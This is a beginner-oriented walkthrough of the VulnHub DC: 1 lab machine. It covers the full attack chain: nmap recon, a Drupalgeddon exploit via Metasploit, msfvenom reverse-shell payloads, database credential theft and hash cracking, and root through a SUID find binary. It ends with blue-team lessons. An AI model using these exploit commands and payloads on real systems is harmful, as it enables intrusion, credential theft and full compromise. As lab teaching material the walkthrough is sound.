# DC: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational, step-by-step walkthrough for students. This is the first machine in
> the **DC** series by DCAU. It is intentionally vulnerable and must only ever be
> run on an isolated lab network.

| Field | Value |
| --- | --- |
| **Machine** | DC: 1 |
| **Difficulty** | Beginner |
| **Author** | DCAU |
| **Released** | 28 February 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/dc-1,292/> |
| **Download** | <https://vulnhub.com/entry/dc-1,292/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux — Debian 7 32-bit (kernel 3.2), Apache 2.2.22 + Drupal 7 |

> **Note:** exact banners, ports and file contents can differ slightly between the
> VirtualBox and VMware builds of this box ("varies by build"). The attack *chain*
> below is stable; small details (a service version, a directory listing) may move
> around. When in doubt, re-run the enumeration yourself.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target host on an isolated lab network (ARP scan + Nmap).
- How to read a port scan and spot a **CMS (Content Management System)** behind a web server.
- How to fingerprint **Drupal 7** and look up its known vulnerabilities.
- What **Drupalgeddon** is (CVE-2014-3704) and how a single old CMS bug gives a shell.
- How to read a CMS config file (`settings.php`) to steal **database credentials**.
- How to dump a Drupal `users` table and deal with a PHPass password hash.
- How to abuse a **SUID `find` binary** to become root (GTFOBins).
- How to think like a defender and stop every one of the above.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so its IP can change every time you import it — always confirm.

First look at your own network interface. This tells you which subnet to scan.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network. The `/24` says the first three numbers are shared, so
> the target will also have a `192.168.56.x` address.

Now sweep the subnet for live hosts.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` asks every address "who has this IP?" over ARP and
> lists whoever answers. ARP is fast and a host firewall usually can't hide from
> it. The MAC starting `08:00:27` is a VirtualBox network card.

`netdiscover -r 192.168.56.0/24` does the same job if you prefer it.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

Now ask Nmap to identify the services and versions on those ports.

```bash
sudo nmap -sC -sV -p 22,80,111 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ /themes/ /CHANGELOG.txt
|_/install.php /LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **Why it works:** `-p-` scans all 65,535 TCP ports, `-sV` guesses each service
> version and `-sC` runs Nmap's safe default scripts. Two things stand out:
> a **web server on port 80** and a meta tag telling us the site is built on
> **Drupal 7**. Port 111 (rpcbind) is noise we can ignore. Web apps are almost
> always the biggest attack surface, so we start there.

![Nmap service scan output](images/02-nmap.png)

### 2.2 Fingerprinting the CMS

The web page source contains `<meta name="Generator" content="Drupal 7 ...">`.
We can also ask Nmap to run its vulnerability scripts:

```bash
sudo nmap -sV -p 80 --script http-vuln-cve2014-3704,http-enum 192.168.56.101
```

```text
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-vuln-cve2014-3704:
|   VULNERABLE:
|   Drupal - pre Auth SQL Injection Vulnerability  (Drupalgeddon)
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-3704
|_http-enum:
|   /CHANGELOG.txt: Drupal file
|   /: Drupal version 7
```

> **Why it works:** the script literally names the bug: **CVE-2014-3704**, the
> famous "Drupalgeddon" pre-authentication SQL injection in Drupal 7 before
> version 7.32. This box ships Drupal **7.24**, so it is vulnerable. We don't even
> need valid credentials to exploit it.

Browse the site manually to confirm.

```bash
curl -s http://192.168.56.101/ | grep -i generator
curl -s http://192.168.56.101/CHANGELOG.txt | head -n 5
```

```text
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
Drupal 7.24, 2013-11-20
```

> **Why it matters:** we now know the product (Drupal), the major version (7) and
> the exact version (7.24). That is enough to pick an exploit.

![Fingerprinting Drupal in the page source](images/03-enum.png)

---

## 3. Foothold

### 3.1 The vulnerability — Drupalgeddon (CVE-2014-3704)

Drupal 7 builds SQL `IN (...)` clauses from user-supplied array keys. Before
7.32 it did this safely-looking placeholder expansion incorrectly, so an attacker
can smuggle extra SQL into a query by crafting an array key. Because the bug is
reachable on the login/registration form **before** you authenticate, an attacker
can inject a brand-new **administrator user** — or run arbitrary SQL — with a
single request. It is rated critical (SA-CORE-2014-005).

### 3.2 Exploit it with Metasploit


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```text
msf6 > search drupal drupageddon
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.56.101
msf6 exploit(multi/http/drupal_drupageddon) > set TARGETURI /
msf6 exploit(multi/http/drupal_drupageddon) > set LHOST 192.168.56.10
msf6 exploit(multi/http/drupal_drupageddon) > set TARGET 0
msf6 exploit(multi/http/drupal_drupageddon) > run
```

```text
[*] Sending stage (39736 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.101:49876)
meterpreter > getuid
Server username: www-data
```

> **Why it works:** the module exploits CVE-2014-3704 to run a tiny PHP payload,
> which connects back to our `LHOST`/`LPORT`. The web server executes PHP as its
> own account, `www-data` — our first, low-privilege shell. (If `TARGET 0` fails,
> try `TARGET 1`; the alternate target is a different PHP payload style.)

**Alternative (manual):** the classic admin-adding exploit is Exploit-DB 34992.


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit -m 34992.py
python2 34992.py -t http://192.168.56.101 -u hacker -p Passw0rd!
```

Then log in to `http://192.168.56.101/user/login` as `hacker` and use the Drupal
UI (or the same shell techniques below). **Drupalgeddon2** (CVE-2018-7600,
Metasploit `exploit/unix/webapp/drupal_drupalgeddon2`) also works on this box and
is a good second technique to practise.

### 3.3 Drop to a system shell

```text
meterpreter > shell
Process 1234 created.
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www
```

Upgrade to a proper TTY so you get command history, tab-completion and `Ctrl+C`:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm
```

![Reverse shell caught as www-data](images/04-foothold.png)

### 3.4 Flags 1 and 2 — and database credentials

Look around the web root.

```bash
ls -la /var/www
cat /var/www/flag1.txt
```

```text
Every good CMS needs a config file - and so do you.
```

> **Why it matters:** flag 1 is a hint. It is telling us to go read Drupal's
> **config file**, `sites/default/settings.php`.

```bash
cat /var/www/sites/default/settings.php | grep -A6 databases
```

```text
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
...
Brute force and dictionary attacks aren't the only ways to gain access
(and you will need access). What can you do with these credentials?
```

> **Why it works:** many installers leave credentials in a readable config file.
> Anyone who can read `settings.php` (which the web user can) learns the database
> password. Flag 2 is a hint that we should use these credentials rather than
> brute-force anything.

### 3.5 Dump the Drupal users table

```bash
mysql -u dbuser -pR0ck3t -D drupaldb -e "SELECT uid,name,pass FROM users;"
```

```text
+-----+-------+--------------------------------------------------------------+
| uid | name  | pass                                                         |
+-----+-------+--------------------------------------------------------------+
|   0 |       |                                                              |
|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR       |
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg       |
+-----+-------+--------------------------------------------------------------+
```

> **Why it works:** Drupal stores passwords in a portable PHPass format that
> starts with `$S$`. It is salted and stretched (many rounds), so it is *slow* to
> crack — that is intentional. We have two options (below).

### 3.6 Get the admin password two ways

**Option A — crack the hash offline:**


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
echo '$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# or: hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
```

**Option B — just reset it using Drupal's own hashing tool (faster for beginners):**

```bash
cd /var/www
php scripts/password-hash.sh 'MyNewPass123'
```

```text
password: MyNewPass123   hash: $S$DkIkdKLIvRK0iVHm99Y9X8jrFw7rRvYG0sSm1FLVV3z5Dqzui9r
```

```bash
mysql -u dbuser -pR0ck3t -D drupaldb \
  -e "UPDATE users SET pass='\$S\$DkIkdKLIvRK0iVHm99Y9X8jrFw7rRvYG0sSm1FLVV3z5Dqzui9r' WHERE name='admin';"
```

> **Why it works:** Drupal's `password-hash.sh` produces a hash in the exact
> format Drupal expects. Writing that hash straight into the `users` table is
> equivalent to setting a new password — we never needed to crack the old one.
> Log in at `http://192.168.56.101/user/login` as `admin` / `MyNewPass123`.

### 3.7 Flag 3 — inside the admin panel

Once logged in, the Drupal **Dashboard** shows a leftover piece of content
("flag3"):

```text
Special PERMS will help FIND the passwd - but you'll need to -exec that command
to work out how to get what's in the shadow.
```

> **Why it matters:** this is the box telling us how to get root — it is a hint
> about the **SUID `find`** trick (see section 4).

### 3.8 Flag 4 — a home directory

```bash
ls -la /home
cat /home/flag4/flag4.txt
```

```text
Can you use this same method to find or access the flag in root?
```

> **Why it matters:** flag 4 confirms the intended path: use the *same* technique
> that found this file to reach the flag in `/root`.

![User-side flags](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Look for SUID binaries

A SUID binary runs with the **file owner's** privileges, not yours. If `find` is
owned by root *and* has the SUID bit, it will run as root.


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/bin/su
/bin/ping
/usr/bin/passwd
/usr/bin/find        <-- owned by root, SUID set
...
```

> **Why it works:** `-perm -4000` matches files with the setuid bit. Most hits are
> legitimate, but **`/usr/bin/find` should never be SUID**. `find` can execute a
> command with `-exec`, and because `find` runs as root, so does that command.

### 4.2 Escape to a root shell

```bash
find . -exec /bin/sh \; -quit
id
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

> **Why it works:** the shell is spawned by the SUID `find`, so it inherits
> **euid=0** (effective root). The `-quit` just makes `find` stop after the first
> match. This is a textbook [GTFOBins](https://gtfobins.github.io/gtfobins/find/)
> technique. Note the uid still says `www-data` while `euid` is `0` — you have
> root authority even though `whoami` can look confusing.

### The final flag

```bash
cat /root/thefinalflag.txt
```

```text
Well done. ... Hopefully you've enjoyed this and learned some new skills.
```

![Root proof and final flag](images/06-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Unpatched Drupal 7.24 | `http://192.168.56.101/` | Known critical RCE/SQLi bugs exposed |
| 2 | Drupalgeddon pre-auth SQL injection (CVE-2014-3704 / SA-CORE-2014-005) | Drupal form handling | Remote code execution as `www-data` |
| 3 | Database credentials stored in a web-readable config file | `/var/www/sites/default/settings.php` | Full Drupal DB access (`dbuser:R0ck3t`) |
| 4 | Weak password storage / password reset by DB write | Drupal `users` table (`$S$` PHPass) | Admin login → ease of foothold-to-admin |
| 5 | SUID bit set on `/usr/bin/find` | `/usr/bin/find` (root-owned, SUID) | Trivial local privilege escalation to root |

## 6. Defensive lessons (blue team)

- **Patch your CMS.** Drupalgeddon was fixed in 7.32; keep Drupal (and every web
  app) on a supported version and subscribe to the vendor's security advisories.
- **Least privilege for file permissions.** `settings.php` should not be readable
  by the web server account any more than necessary, and DB users should have only
  the rights the app truly needs.
- **Never store plaintext secrets in the docroot.** Use environment variables or a
  secrets manager; rotate DB passwords; don't let a web compromise equal a DB
  compromise.
- **Enforce strong, slow hashing and rate-limits.** PHPass is slow by design — but
  a database write that resets a password should itself be protected (least
  privilege, monitoring for anomalous `UPDATE users`).
- **Audit SUID/SGID binaries.** `find / -perm -4000 -type f` is a *defender's*
  command too. No standard `find`, `vim`, `less`, `cp` should ever be SUID.
- **Detection ideas:** alert on `GET`/`POST` to Drupal login endpoints with array
  syntax (`[#...]`) in parameters; on outbound connections originating from
  `www-data`; and on new processes spawning a shell directly from `find`.

---

## 7. References

